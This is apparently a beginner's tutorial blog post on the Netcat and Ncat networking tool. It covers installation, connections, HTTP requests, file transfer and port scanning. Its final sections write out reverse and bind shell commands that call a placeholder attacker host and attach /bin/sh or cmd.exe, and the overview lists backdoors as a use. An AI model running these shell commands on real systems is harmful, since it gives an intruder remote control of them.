# How to Use the Netcat (nc) Command: An In-Depth Tutorial

**Author:** Mahmud Hasan Saikot  
**Source:** NoobLinux

---

## Overview

Netcat is known as the "Swiss army knife" of networking tools. It is powerful, flexible, and can be used for:
- TCP/UDP connections
- Port scanning
- File transfers
- Debugging network issues
- Creating backdoors (commonly used in ethical hacking)

This guide covers Netcat (traditional `nc`) and its successor Ncat (from the Nmap project), including practical examples, installation instructions, and advanced use cases like reverse/bind shells.

---

## 📦 Installation

### Linux

**Debian/Ubuntu**:
```bash
sudo apt-get install ncat
```

**Red Hat/CentOS**:
```bash
sudo yum install ncat
```

### Windows

Install Nmap from [nmap.org](https://nmap.org/download.html) — Ncat comes bundled.

### macOS

Use Homebrew or install via Nmap from their site.

### Android (Termux)

```bash
apt update
pkg install nmap
```

---

## 🔌 Establishing Connections

### Creating a Client

```bash
nc -v example.com 80
```

### Sending a Request

Type:
```
HEAD / HTTP/1.1
Host: example.com

```

### Sample Response
```
HTTP/1.1 200 OK
Content-Type: text/html
...
```

---

## 🌐 HTTP Requests with Netcat

Use `curl` to inspect actual request formatting:

```bash
curl -v -I example.com
```

Then simulate it:
```bash
printf "HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

---

## 📡 Listening (Server Mode)

```bash
nc -vlp 5000
```

Open browser to `localhost:5000`, and type this in terminal:
```
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Hello World!</h1>
```

---

## 🔐 SSL/TLS Connections

```bash
printf "HEAD / HTTP/1.1\r\nHost: github.com\r\n\r\n" | nc --ssl github.com 443
```

---

## 💬 Chat Between Hosts

On Machine 1:
```bash
nc -vlp 4000
```

On Machine 2:
```bash
nc <Machine1-IP> 4000
```

---

## 🗂️ File Transfer

### From server:
```bash
cat file.zip | nc -vlp 4000
```

### From client:
```bash
nc <server-ip> 4000 > file.zip
```

---

## 🔎 Port Scanning

```bash
nc -vz scanme.nmap.org 22-80
```

---

## 🛠️ Reverse Shell

**From target (Linux):**
```bash
nc <attacker-ip> 4444 -e /bin/sh
```

**From target (Windows):**
```bash
nc <attacker-ip> 4444 -e cmd.exe
```

**Attacker:**
```bash
nc -vlp 4444
```

---

## 🔒 Bind Shell

**Target:**
```bash
nc -vlp 4444 -e /bin/sh
```

**Attacker:**
```bash
nc <target-ip> 4444
```

---

## ✅ Conclusion

Netcat is a powerful utility for networking, sysadmin tasks, and security testing. Whether you're debugging, transferring files, or setting up sockets, Netcat gives you direct access to TCP/UDP operations.

> For advanced encryption and proxy support, explore [Ncat's User Guide](https://nmap.org/book/ncat-man.html)

